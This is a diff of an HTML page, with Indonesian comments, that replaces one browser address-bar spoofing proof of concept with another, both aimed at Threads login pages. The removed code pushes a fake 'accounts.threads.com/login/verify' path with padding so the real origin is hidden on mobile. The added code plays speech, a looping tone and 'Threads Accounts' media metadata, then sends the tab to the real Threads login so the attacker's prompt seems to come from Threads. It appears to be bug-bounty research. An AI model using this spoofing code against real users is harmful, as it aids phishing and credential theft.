@@ -1,38 +1,22 @@
 <!DOCTYPE html>
-<!-- SPOOF PoC #3 — MECHANISM: history.pushState PATH ILLUSION + truncation padding
-     Fix-point: rendering PATH (bukan userinfo/authority) + pemotongan bilah alamat di mobile.
-     BEDA dari #1-mu (userinfo '@'): di sini tak ada '@', host asli sah, yang menipu = PATH panjang
-     yang diawali string mirip-host, lalu bagian kiri (origin asli) terdorong keluar layar mobile. -->
-<html lang="id"><head><meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1"><title>accounts.threads.com</title>
-<style>body{font-family:-apple-system,'Segoe UI',Roboto,Arial;margin:0;padding:28px;max-width:660px}
-h1{font-size:18px}code{background:#f6f8fa;padding:1px 5px;border-radius:4px;word-break:break-all}
-.cmp{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:14px 0}
-.cmp div{border:1px solid #d0d7de;border-radius:8px;padding:10px;font-size:12px;word-break:break-all}
-.cmp b{display:block;font-size:11px;color:#57606a}.fake{color:#1a7f37}.real{color:#cf222e}
-button{cursor:pointer;font-size:14px;border:1px solid #1a73e8;background:#1a73e8;color:#fff;border-radius:8px;padding:10px 18px;font-weight:600;margin:4px 6px 4px 0}
-.warn{background:#fff8c5;border:1px solid #d4a72c;border-radius:8px;padding:8px 12px;font-size:12px;color:#7a5c00;margin-top:12px}</style></head>
-<body>
-<h1>Spoof PoC #3 — pushState Path Illusion</h1>
-<p>Mengubah PATH yang ditampilkan bilah alamat tanpa navigasi. Di mobile, origin asli (kiri) terpotong; yang terlihat = string mirip-host di awal path.</p>
-<div class="cmp">
-  <div><b>DISPLAYED (setelah push)</b><span class="fake" id="disp"></span></div>
-  <div><b>REAL origin</b><span class="real" id="real"></span></div>
-</div>
-<button onclick="push(1)">▶ Push path mirip-host</button>
-<button onclick="push(2)">▶ Push + padding (mobile truncation)</button>
-<button onclick="history.back()">↩ Kembalikan</button>
-<div class="warn">Vulnerable bila di layar sempit bagian yang terbaca cuma <code>accounts.threads.com/...</code> dan origin aslimu tak terlihat. Screenshot → STOP → lapor.</div>
+<!-- REAL-TARGET SPOOF PoC — cross-navigation resource lifetime (TTS/audio/MediaSession)
+     Arm resource dari origin-mu, lalu navigasi tab ke Threads asli. Bila resource bertahan di
+     halaman Threads (bilah alamat = threads.com asli, "suara"/now-playing = penyerang) = misatribusi.
+     Kelas CVE-2026-7935/8963. Paling kuat di mobile Chrome/Safari. -->
+<html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
+<body style="font-family:system-ui;padding:24px">
+  <h3>Threads spoof PoC (cross-nav resource)</h3>
+  <button style="font-size:16px;padding:12px 20px" onclick="go()">Continue to Threads</button>
 <script>
-document.getElementById('real').textContent=location.origin;
-function push(mode){
-  let path;
-  if(mode===1){ path='/accounts.threads.com/login/verify?session=continue'; }
-  else{ // padding: dorong origin asli keluar layar via segmen panjang
-    const pad='⁄'.repeat(0)+'-'.repeat(90);
-    path='/'+pad+'/accounts.threads.com/login/verify';
-  }
-  history.pushState({},'',path);
-  document.getElementById('disp').textContent=location.href;
+var TARGET = "https://www.threads.com/login";     // <-- target in-scope
+function tone(){var sr=8000,n=sr,b=new Uint8Array(44+n*2),d=new DataView(b.buffer),w=function(o,s){for(var i=0;i<s.length;i++)d.setUint8(o+i,s.charCodeAt(i))};
+ w(0,'RIFF');d.setUint32(4,36+n*2,true);w(8,'WAVE');w(12,'fmt ');d.setUint32(16,16,true);d.setUint16(20,1,true);d.setUint16(22,1,true);d.setUint32(24,sr,true);d.setUint32(28,sr*2,true);d.setUint16(32,2,true);d.setUint16(34,16,true);w(36,'data');d.setUint32(40,n*2,true);
+ for(var i=0;i<n;i++)d.setInt16(44+i*2,Math.sin(i/14)*900,true);var s='';for(var j=0;j<b.length;j++)s+=String.fromCharCode(b[j]);return 'data:audio/wav;base64,'+btoa(s);}
+function go(){
+  try{ var u=new SpeechSynthesisUtterance("Verifikasi keamanan Threads. Demo suara lintas navigasi. ".repeat(6)); speechSynthesis.speak(u); }catch(e){}
+  try{ var a=new Audio(tone()); a.loop=true; a.play(); }catch(e){}
+  try{ if('mediaSession' in navigator) navigator.mediaSession.metadata=new MediaMetadata({title:"Masuk ke Threads",artist:"Threads Accounts"}); }catch(e){}
+  setTimeout(function(){ location.href=TARGET; }, 1500);   // navigasi tab ini ke Threads asli
 }
-</script></body></html>
+</script>
+</body></html>
